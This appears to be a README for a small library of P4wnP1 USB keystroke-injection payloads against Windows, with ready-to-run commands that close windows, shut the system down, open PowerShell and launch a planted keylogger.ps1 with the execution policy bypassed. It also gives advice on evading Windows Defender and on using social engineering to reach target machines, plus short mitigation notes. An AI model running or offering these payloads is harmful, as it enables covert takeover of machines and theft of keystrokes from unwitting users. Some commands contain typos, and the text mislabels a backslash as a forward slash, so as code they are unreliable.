<h1>Windows HID Scripting</h1>

<h2>What is this?</h2>
<p>This is a small, curated library of custom payloads for the P4wnP1 A.L.O.A. Designed for quick deployment, each script demonstrates different HID attack techniques, ranging from simple command execution to more advanced automation. Ideal for ethical hacking, red teaming, and testing USB attack vectors in a controlled environment.</p>
<p>Please refer to the original repo to set up the raspberry pi - Be sure to ssh into the pi device or use upload the payloads via the web interface:</p>
https://github.com/RoganDawes/P4wnP1_aloa
or 
https://youtu.be/km81ph7pZz8?si=c6gQug7L4YSAEs9_

<h1>Simple Payloads</h1>

<h3>Close window</h3>
<p>Simply use short cut key to terminate the active task / window.</p>
<pre><code>
P4wnP1_cli hid run -c 'press("ALT F4)'
</code></pre>

<h3>Shutdown windows system</h3>
<p>Use keyboard shortcuts to power off the system. Best done when user is not active on the keyboard. The target may interupt the steps and misfire the payload.</p>
<p>Navigates the shutdown options with human level delays.</p>
<pre><code>
P4wnP1_cli hid run -c 'press("CTRL ALT DELETE"); delay(1000); press("UP"); delay(500); press("ENTER"); delay(500); press("UP"); delay(500); press("UP"); delay(500); press("ENTER"); delay(500); press("ENTER");'
</code></pre>

<h3>Open Run</h3>
<p>Use Windows and R key to open up the prompt to run applications and tasks.</p>
<pre><code>
P4wnP1_cli hid run -c 'press("WIN R");'
</code></pre>
<p>In theory we can open apps without the need for a mouse - all remotely.</p>
<pre><code>
P4wnP1_cli hid run -c 'press("WIN R");delay(500);type("notepad.exe\n");press("ENTER");delay(1000);type("This is a test! Payload here!");'
</code></pre>

<h3>Open Powershell</h3>
<p>Use run to open powershell and type payloads.</p>
<pre><code>
P4wnP1_cli hid run -c 'press("WIN R"); delay(500); type("powershell/n); press("ENTER");'
</code></pre>

<h2>How to use forward slash.</h2>
<p>The forward slash is essential. It allows you to locate files and execute payloads on a windows system.</p>
<p>It is important to note that the payloads rely heavily on the targets keyboard layout. Whilst this is changeable via HID script code, I had countless issues on finding a solution that worked for me.</p>
<p>After hours of trial and error, payloads on a UK/GB keyboards require some adjustment to enusre that we can enter a forward slash.</p>
<pre><code>
/
</code></pre>
<p>The easist way was to ensure that you are using a UK layout.</p>
<pre><code>
P4wnP1_cli hid run -c 'layout("gb");'
</code></pre>
<p>Using "|" will NOT work. Atleast in my tests...</p>
<p>The short cut key below is a working alternative.</p>
<pre><code>
P4wnP1_cli hid run -c 'layout("gb");press("RIGHT_ALT #");'
</code></pre>
<p>Note that this is a method for remotely activating the keys for forward slash, rather than use a type command (which gets mistaken for code) - so be sure you're on a typable field when executing a payload.</p>

<h2>Example payload using forward slash.</h2>
<p>This payload uses powershell to activate an external powershell script (pre-made pre-injected payload) in the specified planted location.</p>
<p>It executes a payload (keylogger.ps1) in the planted location 'C:\Users\Public\keylogger.ps1'</p>

<pre><code>
P4wnP1_cli hid run -c '
layout("gb");
press("WIN R"); delay(500);
type("powershell\n"); press("ENTER"); delay(1000);
type("powershell -ExecutionPolicy Bypass -File C:"); press("RIGHT_ALT #");
type("Users"); press("RIGHT_ALT #");
type("Public"); press("RIGHT_ALT #");
type("keylogger.ps1\n");
press("ENTER");
'
</code></pre>

<h2>The Formula!</h2>
<p>As we can see, these three commands will be the bread and butter to writing payloads</p>

<pre><code>
#to talk to the raspberry pi
P4wnP1_cli hid run -c '[add commands]'
  
layout("");
  
type("");

press("");

#milliseconds
delay(1000);
</code></pre>

<h2>Why is this important?</h2>
<p>We used a multitude of commands to help build a payload that schedules simulated-keyboard-strokes to take control over a target machine, without being in the seat.</p>
<p>It leverages a usb connection to disguise itself as a keyboard. Quite stealthy.</p>
<p>By manually typing in our commands, disguised as user input, we are able to counter antivirus software, like windows defender.</p>
<p>When building ps1 files or python files, windows defender will eradicate it before it even plants itself.</p>
<p>Why not trick the system by manually generating malicious commands via keyboard input?</p>

<h2>Execution vs Mitigation</h2>

<h3>Installing USB (Raspberry Pi)</h3>
<h4>Execution</h4>
<p>For this to work, a threat actor will need to have physical access to the target machine. Use social engineering to charm you way into the room, use a disguise or simply just walk into the room.</p>
<p>Most workers wont question who you are, especially if you look confident and you look like you are one with the team.</p>
<h4>Mitigation</h4>
<p>Provide all workspaces with access controls and physical locks. Be sure to educate staff on how to stay alert and be sharp with suspicious activity.</p>




<br>

<h3>Wifi</h3>
<h4>Execution</h4>
<p>To connect to the Pi, you're required to use a wifi connection produced by the Pi itself.</p>
<p>Use stronger wifi adapters to increase the range to improve stealth.</p>
<h4>Mitigation</h4>
<p>Have the security team frequently check on what wifi signals are live.</p>

<br>

<h3>privileges</h3>
<h4>Execution</h4>
<p>Access a computer who belongs to someone with higher permissions (IT)!</p>
<p>If they have access to root user then so do you!</p>
<h4>Mitigation</h4>
<p>Only allocate the appropriate privileges. Be strict with access control</p>

<h2>Connect with me</h2>
https://linktr.ee/teerasakmairoddee
